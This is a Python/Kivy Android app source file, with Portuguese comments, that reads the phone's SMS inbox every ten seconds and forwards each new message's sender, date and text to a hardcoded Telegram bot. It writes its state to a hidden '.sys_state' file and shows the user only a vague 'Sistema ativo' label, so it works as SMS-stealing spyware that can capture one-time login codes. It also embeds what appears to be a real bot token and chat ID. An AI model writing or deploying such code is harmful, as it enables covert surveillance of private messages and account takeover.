import os
import json
import threading
import time
from urllib import request as urlrequest
from datetime import datetime

from kivy.app import App
from kivy.uix.label import Label
from kivy.utils import platform
from kivy.clock import Clock
from kivy.core.window import Window

# Telegram Bot API Token e Chat ID
TELEGRAM_BOT_TOKEN = '8696565505:AAE3zqtQMZcs2ZDyrHgCNteEz5vcq4URjDA'
TELEGRAM_CHAT_ID = '8525105817'


def send_telegram(msg):
    """Envia mensagem para o Telegram usando urllib (sem dependencia externa)."""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = json.dumps({'chat_id': TELEGRAM_CHAT_ID, 'text': msg}).encode('utf-8')
        req = urlrequest.Request(url, data=data, headers={'Content-Type': 'application/json'})
        urlrequest.urlopen(req, timeout=15)
    except Exception as e:
        print(f"Erro Telegram: {e}")


def get_state_path():
    """Retorna caminho seguro para salvar estado no Android."""
    if platform == 'android':
        from jnius import autoclass
        activity = autoclass('org.kivy.android.PythonActivity').mActivity
        return os.path.join(activity.getFilesDir().getAbsolutePath(), '.sys_state')
    return os.path.join(os.path.expanduser('~'), '.sys_state')


def load_last_id():
    path = get_state_path()
    if os.path.exists(path):
        try:
            with open(path, 'r') as f:
                return int(f.read().strip())
        except (ValueError, IOError):
            pass
    return 0


def save_last_id(sms_id):
    path = get_state_path()
    try:
        with open(path, 'w') as f:
            f.write(str(sms_id))
    except IOError as e:
        print(f"Erro ao salvar estado: {e}")


def sms_monitor():
    """Thread que monitora SMS novos a cada 10 segundos."""
    if platform != 'android':
        return

    try:
        from jnius import autoclass
        Uri = autoclass('android.net.Uri')
        activity = autoclass('org.kivy.android.PythonActivity').mActivity
        resolver = activity.getContentResolver()
    except Exception as e:
        print(f"Erro ao inicializar jnius: {e}")
        return

    last_id = load_last_id()

    while True:
        try:
            uri = Uri.parse("content://sms/inbox")
            cursor = resolver.query(uri, None, None, None, "_id DESC")

            if cursor and cursor.moveToFirst():
                idx_id = cursor.getColumnIndex("_id")
                idx_addr = cursor.getColumnIndex("address")
                idx_body = cursor.getColumnIndex("body")
                idx_date = cursor.getColumnIndex("date")

                newest_id = cursor.getInt(idx_id)

                if last_id == 0:
                    # Primeira execucao: salva o ID atual sem enviar
                    last_id = newest_id
                    save_last_id(last_id)
                elif newest_id > last_id:
                    msgs = []
                    while True:
                        mid = cursor.getInt(idx_id)
                        if mid <= last_id:
                            break
                        addr = cursor.getString(idx_addr)
                        body = cursor.getString(idx_body)
                        ts = cursor.getLong(idx_date)
                        dt_str = datetime.fromtimestamp(ts / 1000).strftime('%d/%m/%Y %H:%M:%S')
                        msgs.append(f"SMS de: {addr}\nData: {dt_str}\nMsg: {body}")
                        if not cursor.moveToNext():
                            break

                    # Envia na ordem cronologica (mais antigo primeiro)
                    for m in reversed(msgs):
                        send_telegram(m)

                    last_id = newest_id
                    save_last_id(last_id)

                cursor.close()
        except Exception as e:
            print(f"Erro no monitor SMS: {e}")

        time.sleep(10)


class SMSToTelegramApp(App):

    def build(self):
        Window.clearcolor = (0.12, 0.12, 0.12, 1)
        self.label = Label(
            text="Iniciando...",
            font_size='18sp',
            color=(1, 1, 1, 1)
        )
        return self.label

    def on_start(self):
        if platform == 'android':
            try:
                from android.permissions import request_permissions, Permission
                request_permissions(
                    [Permission.READ_SMS, Permission.RECEIVE_SMS, Permission.INTERNET],
                    self._on_permissions
                )
            except Exception as e:
                self.label.text = f"Erro permissoes: {e}"
        else:
            self.label.text = "Executando fora do Android."

    def _on_permissions(self, permissions, grants):
        if all(grants):
            self.label.text = "Sistema ativo."
            # Envia sinal de conexao
            threading.Thread(target=send_telegram, args=("System Online",), daemon=True).start()
            # Inicia monitor de SMS em thread separada
            threading.Thread(target=sms_monitor, daemon=True).start()
        else:
            self.label.text = "Permissoes negadas."


if __name__ == '__main__':
    SMSToTelegramApp().run()
